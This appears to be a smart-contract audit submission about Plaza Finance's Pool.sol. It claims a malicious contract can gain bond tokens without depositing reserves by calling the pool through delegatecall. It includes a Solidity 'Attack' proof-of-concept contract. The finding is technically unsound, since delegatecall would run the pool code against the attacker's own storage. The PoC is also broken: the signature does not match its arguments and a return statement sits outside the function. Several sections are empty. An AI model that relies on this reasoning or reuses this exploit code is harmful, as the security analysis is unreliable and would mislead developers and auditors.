# Reserve tokens can be transferred to a malicious contract, not the pool

### Summary

Users create bond tokens with their reserves deposit. However, a malicious user can receive bond tokens without making any deposits.

### Root Cause

In [Pool.sol](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L192C1-L194C4), anyone can buy bond tokens by depositing their reserve tokens. Unfortunately, not all users are honest. The attacker exploits this by using a malicious contract.

```solidity
 function _create(
    TokenType tokenType,
    uint256 depositAmount,
    uint256 minAmount,
    address onBehalfOf) private returns(uint256) {
    ...
   // Take reserveToken from user
    IERC20(reserveToken).safeTransferFrom(msg.sender, address(this), depositAmount); 
    ...
  }
```

If the attacker uses `delegatecall` with this function, they can successfully receive bond tokens without making a deposit. This occurs because there is no check on the pool balance.

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

_No response_

### Impact

The attacker can receive bond tokens without making any deposits.

### Proof of Concept (PoC)

The attacker can use the following contract:

```solidity
contract Attack is Pool, Test, TestCases {
  address public owner;
  Pool public pool;

  constructor(Pool _pool) {
    owner = msg.sender;
    pool = Pool(_pool);
  }

  function attackPool (
    TokenType tokenType,
    uint256 depositAmount,
    uint256 minAmount
  ) external returns(uint256) {
    (bool success, bytes memory data) = address(pool).delegatecall(abi.encodeWithSignature("create(uint256)", tokenType, depositAmount, minAmount));
  }
  return uint256(data);
}
```

### Mitigation

To mitigate this issue, ensure that tokens are transferred to an indexed address or verify that the change in the pool's reserve token balance is below the `depositAmount`.
